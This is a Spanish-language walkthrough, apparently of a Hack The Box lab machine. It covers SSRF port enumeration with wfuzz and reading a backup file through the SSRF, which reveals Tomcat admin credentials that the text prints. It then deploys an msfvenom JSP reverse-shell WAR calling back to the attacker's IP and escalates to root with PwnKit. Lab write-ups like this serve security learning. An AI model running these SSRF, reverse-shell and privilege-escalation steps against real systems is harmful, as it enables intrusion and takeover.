PORT      STATE SERVICE
22/tcp    open  ssh
8009/tcp  open  ajp13
8080/tcp  open  http-proxy
60000/tcp open  unknown

-En el puerto 8080 hay un Apache Tomcat y en el 60000 una web

-Entramos a la web del puerto 60000 y vemos un input donde podemos 'navegar por internet de forma anónima'.

-Probamos a poner la dirección de nuestro Servidor para ve si recibimos conexión:
	-http://10.10.14.18/
		**"GET / HTTP/1.1" 200 -**

-Intentamos Ejecutar Código PHP:
	-http://10.10.14.18/id.php
		-Nos no Interpreta el Contenido

## SSRF - Ports Discovery

-Probamos un SSRF, Enumeramos Puertos que sabemos que están Abiertos:
	-http://localhost:22
		**SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2**
		FUNCIONA!!!
	-http://localhost:8080
		 **Apache Tomcat/8.5.5**

-Fuerza Bruta para Descubrir Puertos con Wfuzz:
	-wfuzz -c --hl=2 -t 200 -z range,1-65535 "http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ"
		**"320"**                   
		**"22"**                    
		**"110"**                   
		**"200"**                   
		**"90"**                    
		**"888"**                   
	    **"60000"**     

-Probamos con el 888:
	-http://localhost:888/
		-Vemos Directorio --> backup

-Lo malo que al darle, nos lleva a un recurso en el puerto 60000 y no podemos ver nada, la URL es la siguiente:
	-http://10.10.10.55:60000/url.php?doc=backup
		-Está usando el **Parámetro ?doc** para Listar el Archivo

-La URL dónde si podemos ver el contenido en el puerto 888 , se ve así:
	-http://10.10.10.55:60000/url.php?path=http://localhost:888/

-Fusionamos las dos URLs para poder ver el Contenido del Archivo Correctamente:
	-http://10.10.10.55:60000/url.php?path=http://localhost:888/?doc=backup
		-CONTROL + U y vemos el Contenido
			**username="admin" password="3@g01PdhB!" roles="manager,manager-gui,admin-gui,manager-script"**
				-Usuario y Contraseña del Usuario 'admin' en el Tomcat del puerto 8080!!

--------------------------------------------------------------------------

-Tenemos los permisos 'managuer-gui' y 'manager-script', por lo que nos podemos Autenticar tanto por Navegador como por Consola.

-Nos Autenticamos en el Tomcat con las credenciales obtenidas por Consola:
	-Nos vamos a 'http://10.10.10.55:8080/manager/html';
		-Username: admin
		-Password: 3@g01PdhB!
			-Estamos Dentro!!

-Generamos una RS .war con msfvenom:
	-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.18 LPORT=1234 -f war -o shell.war

-En el Tomcat --> Browse --> shell.war --> Deploy --> Clickamos en 'shell'
	**connect to [10.10.14.18] from (UNKNOWN) [10.10.10.55] 58182**
		**whoami** 
			**tomcat**

#### Tratamiento de la TTY

-No funciona con script /dev/null -c bash

-Lo hacemos con Python:
	-python -c 'import pty; pty.spawn("/bin/bash")'
	CTROL + Z 
	stty raw -echo;fg
	reset xterm
	export TERM=xterm
		**tomcat@kotarak-dmz:/$** 

## Escalada de Privilegios

-Abusamos de /usr/bin/pkexec con el Pwnkit

-El root.txt está en:
	**/var/lib/lxc/kotarak-int/rootfs/root/root.txt**



